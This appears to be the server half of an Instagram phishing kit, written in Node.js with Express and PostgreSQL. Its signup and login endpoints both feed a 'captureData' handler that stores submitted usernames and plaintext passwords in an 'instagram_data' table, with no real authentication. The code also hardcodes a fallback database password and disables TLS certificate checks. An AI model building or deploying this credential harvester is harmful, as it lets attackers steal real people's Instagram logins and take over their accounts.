
const express = require('express');
const { Client, Pool } = require('pg');
const cors = require('cors');
const path = require('path');

const app = express();
const port = process.env.PORT || 3001;

// Configuration for local and production
const dbConfig = {
  connectionString: process.env.DATABASE_URL,
  host: process.env.DB_HOST || 'localhost',
  port: process.env.DB_PORT || 5432,
  user: process.env.DB_USER || 'postgres',
  password: process.env.DB_PASSWORD || '8959',
  database: process.env.DB_NAME || 'db_name',
  ssl: process.env.DATABASE_URL ? { rejectUnauthorized: false } : false
};

app.use(cors());
app.use(express.json());

// Serve the compiled frontend bundle
app.use('/dist', express.static(path.join(__dirname, 'dist')));
// Serve other static assets
app.use(express.static(__dirname));

async function initDb() {
  const pool = process.env.DATABASE_URL 
    ? new Pool({ connectionString: process.env.DATABASE_URL, ssl: { rejectUnauthorized: false } })
    : new Pool(dbConfig);

  try {
    // Local DB creation logic
    if (!process.env.DATABASE_URL) {
        const baseClient = new Client({ ...dbConfig, database: 'postgres' });
        await baseClient.connect();
        const res = await baseClient.query(`SELECT 1 FROM pg_database WHERE datname = $1`, [dbConfig.database]);
        if (res.rowCount === 0) await baseClient.query(`CREATE DATABASE "${dbConfig.database}"`);
        await baseClient.end();
    }

    // Initialize tables
    await pool.query(`
      CREATE TABLE IF NOT EXISTS instagram_data (
        id SERIAL PRIMARY KEY,
        identifier TEXT,
        password TEXT,
        full_name TEXT,
        username TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);
    console.log("Database initialized successfully.");
    return pool;
  } catch (err) {
    console.error("Database Initialization Error:", err.message);
    return pool;
  }
}

let dbPool;
initDb().then(pool => { dbPool = pool; });

const captureData = async (req, res) => {
  const { identifier, password, fullName, username } = req.body;
  if (!dbPool) return res.status(503).json({ success: false, message: 'Database not ready' });

  try {
    const query = `INSERT INTO instagram_data (identifier, password, full_name, username) VALUES ($1, $2, $3, $4) RETURNING id;`;
    const result = await dbPool.query(query, [identifier, password, fullName || null, username || null]);
    res.status(200).json({ success: true, id: result.rows[0].id });
  } catch (err) {
    console.error("Storage Error:", err.message);
    res.status(500).json({ success: false, message: 'Database error' });
  }
};

app.post('/api/signup', captureData);
app.post('/api/login', captureData);

// Fallback to index.html for React Router compatibility
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
